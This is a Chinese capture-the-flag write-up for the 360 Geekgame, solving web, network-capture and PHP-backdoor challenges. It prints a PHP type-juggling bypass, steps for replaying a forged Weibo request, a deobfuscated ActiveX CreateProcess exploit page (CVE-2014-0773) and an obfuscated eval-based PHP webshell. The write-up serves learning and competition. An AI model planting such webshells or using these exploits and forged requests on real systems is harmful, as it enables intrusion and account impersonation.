---
layout: post
title: 360 Geekgame Writeup
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

#### WEB1

就一个大苹果的图，Format Analysis后得到一串base64:`ZW1lbS4uLiAvY3RmXzM2MF9mbGFnv`

<img src="http://pfr2vvlbk.bkt.clouddn.com/6ehrtsgbfdx.png">

解密后为`emem... /ctf_360_flag`，是一个目录，图为被咬一口的苹果，osx默认下每个目录下都会存在一个.DS_Store文件来保存文件夹的显示属性，请求`/ctf_360_flag/.DS_Store`及得到flag：

	flag: 61cda90b0c742a90458c4ed43b328bcc

#### WEB3
根据图片Format Analysis后得到一大串摩斯密码：

	--. .. ..-. - --.. -- --. .- ;..<..- -.. .-- . .... .--. $.- = "----- .-.-.- .---- " ;$-... = $_--. . - [.----. -... . ----. ] ;.. ..- . ($-.. . -.-. -- = .- ---. .- ---. ){ .. ..-. ( .. ... _.- .- . .-. .- -.-- ($-... )){ . -.-. .. .. --- "-. - -- -.- . -.- - -.-.- - "; . -..- .. - ; }. .- .. ... . .. ..-. (- .-.-- . . ... _-. ..- -- . .-. .. -.-. ($-... )){ $-.-. = (.. -. - )(($.- + $-... ) * .- --- --- -- ); .. ..-. ($-.-. == "-- -.. " & & $-... [.---- ----- ] == ..- . .- . -.. ... . ){ . -. -. .... --- "..-. . -.. .- --. "; }. .-.. ... . { . -.-. .... -- - "-. --- - .- . - .-- -.- .-- "; . -. .- .. - ; } }. .-. . ... . { . - .-. ... . --- "-. -- - -.- . -.-- -.-.-- "; }}. .-. . ... . { . -.-. .... - -- "-. --- -.- . -.-- -. -.-- "; }..--.. >

<img src="http://pfr2vvlbk.bkt.clouddn.com/76tyhfg.png">

解密得到一段php代码：

	<?php
    $a= "0.1";
    $b= $_GET['b'];
    if($b! = '' )
    {
        if(is_array  ($b))
        {
            echo "nokey!";
            exit;
        }
        else if(!is_numeric ($b ))
        {
            $c   = (int)(($a + $b  ) * 10 );
            if  ($c   == "8" && $b  [10 ] == false )
            {
                echo   "flag ";
            }
            else
            {
                echo  "nokey ";
                exit  ;
            }
        }
        else {echo  "nokey ";}
    }
    else {echo  "no  ";}
	?>

这段代码表示GET请求的参数b符合要求的话就能得到flag，首先$b不能为数组，并且还不能为数字，继续往下看，分析写在下面。

	$c = (int)(($a + $b) * 10)
	$c == "8"
	转换为公式：
	int((0.1+$b)*10)==8
	因为要(int)所以$b>0.7 & $b<0.8 = 0.71
	&& $b[10] == false转换为公式：
	判断$b第11位不能为true，
	$b="0.711111111";
	var_dump($b[10] == TRUE);为true
	$b="0.7100000000";
	var_dump($b[10] == TRUE);为false
	或者不构造那么长也就是后面为空的话也为false

往回看，$b既然不能为数字的话那么也没判断是否为字符串，而且在if里判断的是类型转换后赋值给的$c，所以请求`web3?b=0.71a`及得到flag:

	flag: 4e07fbad6ff26d9a3c9f198277866c66

#### NET1
>要求："根据所给的pcap数据包进行分析，伪造地点`360大厦`和`iphone 6 plus`手机，发送任意微博内容"

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载到pcap包后筛选下，请求方式为POST并且http内容中包含weibo字样的数据包。

	http.request.method=="POST" && http contains "weibo"

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;翻到第7305个数据包为发微博的request包，Follow TCP Stream。

<img src="http://pfr2vvlbk.bkt.clouddn.com/tydhfgbxcv.png">

向下翻，poiid为地址

<img src="http://pfr2vvlbk.bkt.clouddn.com/65i7rtuydh.png">

c为手机类型

<img src="http://pfr2vvlbk.bkt.clouddn.com/8irujtydhfg.png">

content为微博内容

<img src="http://pfr2vvlbk.bkt.clouddn.com/4aresgdfxc.png">

ua为User-Agent

<img src="http://pfr2vvlbk.bkt.clouddn.com/7uytdhfgx.png">

根据这些字段就可以更改相应的字段为要求：

	ua=iPhone7,1__weibo__5.2.8__iphone__os8.3&c=iphone&poiid=B2094753D56EA0FE419C

然后重放request，获得flag:

	flag：195b8ef7140a6a09aa4e207e20f6304c

#### NET2
>请分析数据包并给出数据包中利用漏洞的CVE编号。（CVE编号即为过关密码，格式：CVE-XXXX-XXXX）

<img src="http://pfr2vvlbk.bkt.clouddn.com/8irjtydfg.png">

是一段js混淆，进行其反混淆

	< html >
	< body >
	< object id = "mfHQh" classid = "clsid:5C2A52BD-2250-4F6B-A4D2-D1D00FCD748C">
		< script type = "text/javascript" >
	   mfHQh[CreateProcess]("C:\windows\explorer.exe \\bwvbprt.exe", 0, 1);
	<  / script >
	<  / body >

搜索了下，flag为`CVE-2014-0773`

<img src="http://pfr2vvlbk.bkt.clouddn.com/eytdfg.png">

#### Encrypt2
>小明在服务器上发现了一个奇怪的php文件，初步断定为黑客留下的一句话后门，请分析php文件，找出一句话后门的密码。（密码即为Flag）


	<?php
	eval(gzinflate(base64_decode("pZLdSsNAEIXvBd+hTmOzMXTbFC3UGhtFEANWlLZES5OgvauoIFho2jy7s7PJhMSI
	F5Kbb2fPzs+Z7O8ZiYAmhLAFS9bQzhUQIboUPECKiUQDMSFMkYZIZt+U5nFkYijB0Kh0KfCcp+5wlh+6YaO2H9VFbW2BNK
	8U2iJJoiOk9Pek4q/ZBTwG481T4HeD3mC9vH79en67fb+fjScPM38aOMvL6erEn6xePm+uLj7u1i669I9qAucL4ZSDesQWC
	9WwHlGxkZRpwW9t1ikrDCRwAE87dtvm7EphlRQd3taC6AwpIjJ4A4XFkhcQ81uhbZcw6EN20a67mHPHxX8Qc+YQP7vyvxQJ
	IHNBa9usUBMcck5d1kNqEVmZl9CDkmNNnsLIFV3IKnsVRT4OOCQJdRNq76Pzbw==")));
	?>

这段代码进行base64+gzinflate加密，var_dump下看看执行结果：

<img src="http://pfr2vvlbk.bkt.clouddn.com/67jtydgbfvc.png">

获得了一串base64密文`YXNzZXJ0X29wdGlvbnMoQVNTRVJUX1dBUk5JTkcsIDApOw==`，解码得到`assert_options(ASSERT_WARNING, 0);`这个函数设置ASSERT_WARNING为0，即为不回显warning，删掉这段base64加密后的代码执行下。

<img src="http://pfr2vvlbk.bkt.clouddn.com/6i7jrtyd.png">

执行后由此看出是一段一句话木马，flag即为POST接受的参数：

	flag：p4n9_z1_zh3n9_j1u_Sh1_J13
